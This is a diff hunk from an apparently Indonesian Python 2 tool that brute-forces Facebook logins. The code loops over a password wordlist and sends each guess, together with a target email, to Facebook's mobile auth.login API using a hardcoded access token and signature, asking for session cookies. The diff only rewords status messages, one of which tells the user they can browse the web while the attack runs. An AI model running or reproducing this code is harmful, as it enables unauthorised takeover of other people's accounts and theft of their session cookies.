@@ -65,14 +65,14 @@ def start():
             total = total.readlines()
             print '\033[34;1m[\033[37;1m^\033[34;1m] \033[37;1mTarget\033[36;1m :\033[32;1m ' + email
             time.sleep(3.0)
-            print '\033[34;1m[\033[37;1m^\033[34;1m] \033[37;1mTotal List (Proses lama) \033[36;1m:\033[32;1m ' + str(len(total))
+            print '\033[34;1m[\033[37;1m^\033[34;1m] \033[37;1mTotal List \033[36;1m:\033[32;1m ' + str(len(total))
             time.sleep(3.0)
             print
             sandi = open(passw, 'r')
             for pw in sandi:
                 try:
                     pw = pw.replace('\n', '')
-                    sys.stdout.write('\r\033[32;1m[\033[37;1m=\033[32;1m]\033[34;1m Start BruteForce \033[37;1m>\033[35;1m '+email+'\033[37;1m >\033[35;1m '+pw)
+                    sys.stdout.write('\r\033[32;1m[\033[37;1m=\033[32;1m]\033[34;1m Start (Tidak perlu menunggu anda dapat bermain/ berselancar di internet) \033[37;1m>\033[35;1m '+email+'\033[37;1m >\033[35;1m '+pw)
                     sys.stdout.flush()
                     data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + email + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                     mpsh = json.loads(data.text)
